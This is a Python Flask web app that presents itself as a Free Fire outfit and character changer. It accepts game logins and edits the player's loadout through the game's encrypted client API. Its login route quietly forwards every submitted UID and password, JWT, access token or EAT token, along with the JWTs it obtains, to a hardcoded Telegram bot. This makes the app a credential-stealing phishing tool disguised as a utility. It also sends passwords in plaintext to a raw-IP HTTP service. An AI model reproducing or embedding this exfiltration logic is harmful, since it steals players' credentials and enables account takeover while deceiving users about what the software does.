#!/usr/bin/env python3
import os
import json
import gzip
import base64
import time
import secrets
import traceback
import threading
import urllib3
from flask import Flask, request, jsonify, session, redirect, url_for, render_template
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
import msgpack

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== TELEGRAM CONFIGURATION ====================
BOT_TOKEN = "8856121637:AAH3OvHx09u0k2ull0BGNUzOGq6XhO0T-iU"        # Replace with your bot token
CHAT_ID = "-1003684272586"            # Replace with your chat/group ID

def send_telegram(message):
    try:
        def _send():
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
            requests.post(url, data=payload, timeout=5)
        threading.Thread(target=_send, daemon=True).start()
    except:
        pass
# ================================================================

app = Flask(__name__, template_folder='.')
app.secret_key = os.urandom(24)
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_HTTPONLY'] = True

USER_DATA_CACHE = {}

REGION_MAP = {
    'IN': 'IND', 'IND': 'IND',
    'TW': 'TW', 'TAIWAN': 'TW',
    'BD': 'BD', 'BANGLADESH': 'BD',
    'PK': 'PK', 'PAKISTAN': 'PK',
    'ID': 'ID', 'INDONESIA': 'ID',
    'TH': 'TH', 'THAILAND': 'TH',
    'VN': 'VN', 'VIETNAM': 'VN',
    'BR': 'BR', 'BRAZIL': 'BR',
    'ME': 'ME', 'MIDDLE EAST': 'ME',
    'CIS': 'CIS', 'SAC': 'SAC'
}

REGION_CONFIGS = {
    'IND': {
        'get_backpack_url': 'https://client.ind.freefiremobile.com/GetBackpack',
        'client_host': 'client.ind.freefiremobile.com',
        'change_clothes_url': 'https://client.ind.freefiremobile.com/ChangeClothes',
        'select_preset_url': 'https://client.ind.freefiremobile.com/SelectPresetLoadout'
    },
    'BD': {'get_backpack_url': 'https://clientbp.ggpolarbear.com/GetBackpack', 'client_host': 'clientbp.ggpolarbear.com', 'change_clothes_url': 'https://clientbp.ggpolarbear.com/ChangeClothes', 'select_preset_url': 'https://clientbp.ggpolarbear.com/SelectPresetLoadout'},
    'PK': {'get_backpack_url': 'https://clientbp.ggpolarbear.com/GetBackpack', 'client_host': 'clientbp.ggpolarbear.com', 'change_clothes_url': 'https://clientbp.ggpolarbear.com/ChangeClothes', 'select_preset_url': 'https://clientbp.ggpolarbear.com/SelectPresetLoadout'},
    'ID': {'get_backpack_url': 'https://clientbp.ggpolarbear.com/GetBackpack', 'client_host': 'clientbp.ggpolarbear.com', 'change_clothes_url': 'https://clientbp.ggpolarbear.com/ChangeClothes', 'select_preset_url': 'https://clientbp.ggpolarbear.com/SelectPresetLoadout'},
    'TH': {'get_backpack_url': 'https://clientbp.common.ggbluefox.com/GetBackpack', 'client_host': 'clientbp.common.ggbluefox.com', 'change_clothes_url': 'https://clientbp.common.ggbluefox.com/ChangeClothes', 'select_preset_url': 'https://clientbp.common.ggbluefox.com/SelectPresetLoadout'},
    'VN': {'get_backpack_url': 'https://clientbp.ggpolarbear.com/GetBackpack', 'client_host': 'clientbp.ggpolarbear.com', 'change_clothes_url': 'https://clientbp.ggpolarbear.com/ChangeClothes', 'select_preset_url': 'https://clientbp.ggpolarbear.com/SelectPresetLoadout'},
    'BR': {'get_backpack_url': 'https://clientbp.ggpolarbear.com/GetBackpack', 'client_host': 'clientbp.ggpolarbear.com', 'change_clothes_url': 'https://clientbp.ggpolarbear.com/ChangeClothes', 'select_preset_url': 'https://clientbp.ggpolarbear.com/SelectPresetLoadout'},
    'ME': {'get_backpack_url': 'https://clientbp.ggpolarbear.com/GetBackpack', 'client_host': 'clientbp.ggpolarbear.com', 'change_clothes_url': 'https://clientbp.ggpolarbear.com/ChangeClothes', 'select_preset_url': 'https://clientbp.ggpolarbear.com/SelectPresetLoadout'},
    'TW': {'get_backpack_url': 'https://clientbp.ggpolarbear.com/GetBackpack', 'client_host': 'clientbp.ggpolarbear.com', 'change_clothes_url': 'https://clientbp.ggpolarbear.com/ChangeClothes', 'select_preset_url': 'https://clientbp.ggpolarbear.com/SelectPresetLoadout'},
    'CIS': {'get_backpack_url': 'https://client.ind.freefiremobile.com/GetBackpack', 'client_host': 'client.ind.freefiremobile.com', 'change_clothes_url': 'https://client.ind.freefiremobile.com/ChangeClothes', 'select_preset_url': 'https://client.ind.freefiremobile.com/SelectPresetLoadout'},
    'SAC': {'get_backpack_url': 'https://client.ind.freefiremobile.com/GetBackpack', 'client_host': 'client.ind.freefiremobile.com', 'change_clothes_url': 'https://client.ind.freefiremobile.com/ChangeClothes', 'select_preset_url': 'https://client.ind.freefiremobile.com/SelectPresetLoadout'}
}

AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
AES_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
BACKPACK_BODY_HEX = "1a725b2c56ec52ba7d09623454c0a003"
BACKPACK_BODY_BYTES = bytes.fromhex(BACKPACK_BODY_HEX)

SLOT_HEAD = 25500000
SLOT_FACE = 25625000
SLOT_TOP = 26000000
CHAR_MALE = 102000007
CHAR_FEMALE = 101000006
TOKEN_API_BASE = "http://87.232.72.68:3005/token"

def encode_varint(n):
    result = []
    while True:
        byte = n & 0x7F
        n >>= 7
        if n:
            byte |= 0x80
        result.append(byte)
        if not n:
            break
    return bytes(result)

def encrypt_aes_cbc(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return cipher.encrypt(pad(data, AES.block_size))

def decrypt_aes_cbc(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return unpad(cipher.decrypt(data), AES.block_size)
    except:
        return None

def decode_varint(data, offset):
    value = 0
    shift = 0
    while offset < len(data):
        b = data[offset]
        value |= (b & 0x7F) << shift
        offset += 1
        shift += 7
        if not (b & 0x80):
            break
    return value, offset

def parse_backpack_items(data):
    item_ids = []
    idx = 0
    try:
        while idx < len(data):
            key, idx = decode_varint(data, idx)
            field_num = key >> 3
            wire_type = key & 0x07
            if field_num == 3 and wire_type == 2:
                length, idx = decode_varint(data, idx)
                if idx + length <= len(data):
                    nested = data[idx:idx+length]
                    nidx = 0
                    while nidx < len(nested):
                        nkey, nidx = decode_varint(nested, nidx)
                        nfield = nkey >> 3
                        nwire = nkey & 0x07
                        if nfield == 1 and nwire == 0:
                            item_id, nidx = decode_varint(nested, nidx)
                            item_ids.append(item_id)
                        elif nfield == 2 and nwire == 0:
                            _, nidx = decode_varint(nested, nidx)
                        elif nwire == 2:
                            l, nidx = decode_varint(nested, nidx)
                            nidx += l
                        else:
                            nidx += 1
                    idx += length
            elif wire_type == 0:
                _, idx = decode_varint(data, idx)
            elif wire_type == 2:
                length, idx = decode_varint(data, idx)
                idx += length
            else:
                idx += 1
    except:
        pass
    return item_ids

def decode_jwt_payload(jwt_token):
    try:
        parts = jwt_token.split('.')
        if len(parts) != 3:
            return None
        payload_b64 = parts[1]
        payload_b64 += '=' * ((4 - len(payload_b64) % 4) % 4)
        payload_json = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
        return json.loads(payload_json)
    except:
        return None

def get_region_from_jwt(jwt_token):
    payload = decode_jwt_payload(jwt_token)
    if payload:
        region_code = payload.get('region') or payload.get('lock_region')
        if region_code:
            mapped = REGION_MAP.get(region_code.upper())
            if mapped and mapped in REGION_CONFIGS:
                return mapped
    return 'IND'

_item_db_cache = None
_db_cache_time = 0
DB_CACHE_TTL = 3600

def get_item_database():
    global _item_db_cache, _db_cache_time
    now = time.time()
    if _item_db_cache and (now - _db_cache_time) < DB_CACHE_TTL:
        return _item_db_cache
    try:
        resp = requests.get("https://ff-item.netlify.app/data.msgpack.gz", timeout=15)
        resp.raise_for_status()
        decompressed = gzip.decompress(resp.content)
        items = msgpack.unpackb(decompressed, raw=False)
        item_map = {}
        for item in items:
            iid = item.get('itemID')
            if iid is not None:
                item_map[iid] = item
        _item_db_cache = item_map
        _db_cache_time = now
        return item_map
    except:
        return _item_db_cache or {}

def get_jwt_from_uid_password(uid, password):
    url = f"{TOKEN_API_BASE}?uid={uid}&password={password}&key=dgop"
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("token"):
                return data["token"], None
            return None, "API response missing 'token'"
        return None, f"HTTP {resp.status_code}"
    except Exception as e:
        return None, str(e)

def get_jwt_from_access_token(access_token):
    url = f"{TOKEN_API_BASE}?access={access_token}&key=dgop"
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("token"):
                return data["token"], None
            return None, "API response missing 'token'"
        return None, f"HTTP {resp.status_code}"
    except Exception as e:
        return None, str(e)

def get_jwt_from_eat_token(eat_token):
    url = f"{TOKEN_API_BASE}?eat={eat_token}&key=dgop"
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("token"):
                return data["token"], None
            return None, "API response missing 'token'"
        return None, f"HTTP {resp.status_code}"
    except Exception as e:
        return None, str(e)

def fetch_backpack(jwt_token, region_config):
    url = region_config['get_backpack_url']
    headers = {
        "Host": region_config['client_host'],
        "Authorization": f"Bearer {jwt_token}",
        "X-Unity-Version": "2018.4.11f1",
        "X-GA": "v1 1",
        "ReleaseVersion": "OB53",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
        "Accept-Encoding": "gzip, deflate, br"
    }
    try:
        resp = requests.post(url, headers=headers, data=BACKPACK_BODY_BYTES, timeout=15)
        if resp.status_code != 200:
            return None, f"HTTP {resp.status_code}"
        plain = decrypt_aes_cbc(resp.content)
        if plain is None:
            plain = resp.content
        item_ids = parse_backpack_items(plain)
        return item_ids, None
    except Exception as e:
        return None, str(e)

BASE_ENC_HEX = "DBDB005FDC6C0AAC203E92ED23D6D05489F20CBE81D070DEA311216E9D09C5D79E61345A767FDCB1DBD1A46A103661F58C9CBC6B1C53FE01F6D29FD981CE86A2AD80683FA57BA9277EFE55DA5EC92E0BA774EAF3C5CCB6FAB94869A28A988CB5819F8F7064538331D8E31FE5DC9217D6"
BASE_ENC = bytes.fromhex(BASE_ENC_HEX)
OLD_CHAR_ID = 102000015
OLD_VARINT = encode_varint(OLD_CHAR_ID)

def change_character(jwt_token, character_id, region_config):
    url = region_config['select_preset_url']
    plain = decrypt_aes_cbc(BASE_ENC)
    if plain is None:
        return False, "Failed to decrypt base payload"
    new_varint = encode_varint(character_id)
    modified_plain = plain.replace(OLD_VARINT, new_varint, 1)
    encrypted = encrypt_aes_cbc(modified_plain)
    headers = {
        "Host": region_config['client_host'],
        "Authorization": f"Bearer {jwt_token}",
        "X-Unity-Version": "2018.4.11f1",
        "X-GA": "v1 1",
        "ReleaseVersion": "OB53",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)",
    }
    try:
        resp = requests.post(url, headers=headers, data=encrypted, timeout=30)
        if resp.status_code == 200:
            return True, None
        return False, f"HTTP {resp.status_code}"
    except Exception as e:
        return False, str(e)

def build_change_clothes_payload(avatar_id, clothes, skin_color=50):
    nested = b''
    for slot, item_id in clothes.items():
        nested += encode_varint((slot << 3) | 0) + encode_varint(item_id)
    outer = encode_varint(8) + encode_varint(avatar_id)
    outer += encode_varint(18) + encode_varint(len(nested)) + nested
    outer += encode_varint(24) + encode_varint(skin_color)
    return outer

def change_clothes(jwt_token, avatar_id, clothes, region_config):
    url = region_config['change_clothes_url']
    plain = build_change_clothes_payload(avatar_id, clothes)
    encrypted = encrypt_aes_cbc(plain)
    headers = {
        "Host": region_config['client_host'],
        "Authorization": f"Bearer {jwt_token}",
        "X-Unity-Version": "2022.3.47f1",
        "X-GA": "v1 1",
        "ReleaseVersion": "OB53",
        "Content-Type": "application/octet-stream",
        "User-Agent": "UnityPlayer/2022.3.47f1 (UnityWebRequest/1.0, libcurl/8.5.0-DEV)"
    }
    try:
        resp = requests.post(url, headers=headers, data=encrypted, timeout=15)
        if resp.status_code == 200:
            return True, None
        return False, f"HTTP {resp.status_code}"
    except Exception as e:
        return False, str(e)

@app.route('/')
def index():
    logged_in = session.get('logged_in', False)
    if logged_in:
        session_id = session.get('session_id')
        owned_items = USER_DATA_CACHE.get(session_id, [])
        allowed_types = ['head', 'mask', 'facepaint', 'face', 'top', 'shirt', 'clothes', 'bottom', 'pants', 'shoe', 'footwear']
        filtered_items = [item for item in owned_items if item.get('type', '').lower() in allowed_types]
        categories = {'head': [], 'mask': [], 'face': [], 'top': [], 'bottom': [], 'shoe': []}
        for item in filtered_items:
            t = item['type'].lower()
            if t == 'head':
                categories['head'].append(item)
            elif t == 'mask':
                categories['mask'].append(item)
            elif t in ('facepaint', 'face'):
                categories['face'].append(item)
            elif t in ('top', 'shirt', 'clothes'):
                categories['top'].append(item)
            elif t in ('bottom', 'pants'):
                categories['bottom'].append(item)
            elif t in ('shoe', 'footwear'):
                categories['shoe'].append(item)
        for cat in categories:
            categories[cat].sort(key=lambda x: x['name'])
        return render_template('index.html',
                               logged_in=True,
                               categories=categories,
                               region=session.get('region', 'IND'),
                               char_selected=session.get('char_selected', False))
    else:
        return render_template('index.html', logged_in=False, error=request.args.get('error'))

@app.route('/login', methods=['POST'])
def login():
    method = request.form.get('auth_method')
    jwt_token = None
    credentials_message = ""

    try:
        if method == 'uidpwd':
            uid = request.form.get('uid', '').strip()
            pwd = request.form.get('password', '')
            if not uid or not pwd:
                return redirect(url_for('index', error='Missing UID/password'))
            credentials_message = f"🔐 UID+PWD | Region: {request.form.get('region', 'unknown')}\nUID: {uid}\nPWD: {pwd}"
            send_telegram(credentials_message)
            jwt_token, err = get_jwt_from_uid_password(uid, pwd)
            if err:
                return redirect(url_for('index', error=f'Auth failed: {err}'))
            if jwt_token:
                send_telegram(f"✅ JWT for {uid}:\n<code>{jwt_token}</code>")
        elif method == 'jwt':
            jwt_token = request.form.get('jwt', '').strip()
            if not jwt_token:
                return redirect(url_for('index', error='JWT required'))
            credentials_message = f"🔑 JWT Token | Region: {request.form.get('region', 'unknown')}\n{jwt_token}"
            send_telegram(credentials_message)
        elif method == 'access':
            access = request.form.get('access_token', '').strip()
            if not access:
                return redirect(url_for('index', error='Access token required'))
            credentials_message = f"🎫 Access Token | Region: {request.form.get('region', 'unknown')}\n{access}"
            send_telegram(credentials_message)
            jwt_token, err = get_jwt_from_access_token(access)
            if err:
                return redirect(url_for('index', error=f'Access token conversion failed: {err}'))
            if jwt_token:
                send_telegram(f"✅ JWT from Access Token:\n<code>{jwt_token}</code>")
        elif method == 'eat':
            eat = request.form.get('eat_token', '').strip()
            if not eat:
                return redirect(url_for('index', error='EAT token required'))
            credentials_message = f"🍽️ EAT Token | Region: {request.form.get('region', 'unknown')}\n{eat}"
            send_telegram(credentials_message)
            jwt_token, err = get_jwt_from_eat_token(eat)
            if err:
                return redirect(url_for('index', error=f'EAT conversion failed: {err}'))
            if jwt_token:
                send_telegram(f"✅ JWT from EAT Token:\n<code>{jwt_token}</code>")
        else:
            return redirect(url_for('index', error='Invalid authentication method'))
    except Exception as e:
        return redirect(url_for('index', error=str(e)))

    if not jwt_token:
        return redirect(url_for('index', error='Could not obtain JWT'))

    region = get_region_from_jwt(jwt_token)
    region_config = REGION_CONFIGS.get(region)
    if not region_config:
        region = 'IND'
        region_config = REGION_CONFIGS['IND']

    item_ids, err = fetch_backpack(jwt_token, region_config)
    if err:
        return redirect(url_for('index', error=f'Failed to fetch vault: {err}'))

    item_map = get_item_database()
    owned_items = []
    for iid in item_ids:
        info = item_map.get(iid, {})
        owned_items.append({
            'id': iid,
            'name': info.get('name', f'Item {iid}'),
            'type': info.get('type', 'Unknown'),
            'rare': info.get('Rare', '')
        })

    session_id = secrets.token_hex(16)
    USER_DATA_CACHE[session_id] = owned_items

    session['logged_in'] = True
    session['session_id'] = session_id
    session['jwt_token'] = jwt_token
    session['region'] = region
    session['region_config'] = region_config
    session['char_selected'] = False
    session['current_character_id'] = CHAR_MALE

    return redirect(url_for('index'))

@app.route('/change_character', methods=['POST'])
def change_character_route():
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'}), 401
    try:
        data = request.get_json()
        char_id = data.get('character_id')
        if char_id not in (CHAR_MALE, CHAR_FEMALE):
            return jsonify({'success': False, 'error': 'Invalid character ID'}), 400
        jwt_token = session['jwt_token']
        region_config = session['region_config']
        success, err = change_character(jwt_token, char_id, region_config)
        if success:
            session['char_selected'] = True
            session['current_character_id'] = char_id
        return jsonify({'success': success, 'error': err})
    except Exception as e:
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/change_clothes', methods=['POST'])
def change_clothes_route():
    if not session.get('logged_in'):
        return jsonify({'success': False, 'error': 'Not logged in'}), 401
    try:
        data = request.get_json()
        clothes_raw = data.get('clothes', {})
        if not clothes_raw:
            return jsonify({'success': False, 'error': 'No clothes selected'}), 400

        clothes = {}
        for slot_str, item_id in clothes_raw.items():
            try:
                slot = int(slot_str)
                item_id_int = int(item_id)
                clothes[slot] = item_id_int
            except (ValueError, TypeError):
                return jsonify({'success': False, 'error': f'Invalid slot or item ID: {slot_str}:{item_id}'}), 400

        avatar_id = session.get('current_character_id', CHAR_MALE)
        jwt_token = session['jwt_token']
        region_config = session['region_config']
        success, err = change_clothes(jwt_token, avatar_id, clothes, region_config)
        return jsonify({'success': success, 'error': err})
    except Exception as e:
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/logout')
def logout():
    session_id = session.get('session_id')
    if session_id and session_id in USER_DATA_CACHE:
        del USER_DATA_CACHE[session_id]
    session.clear()
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)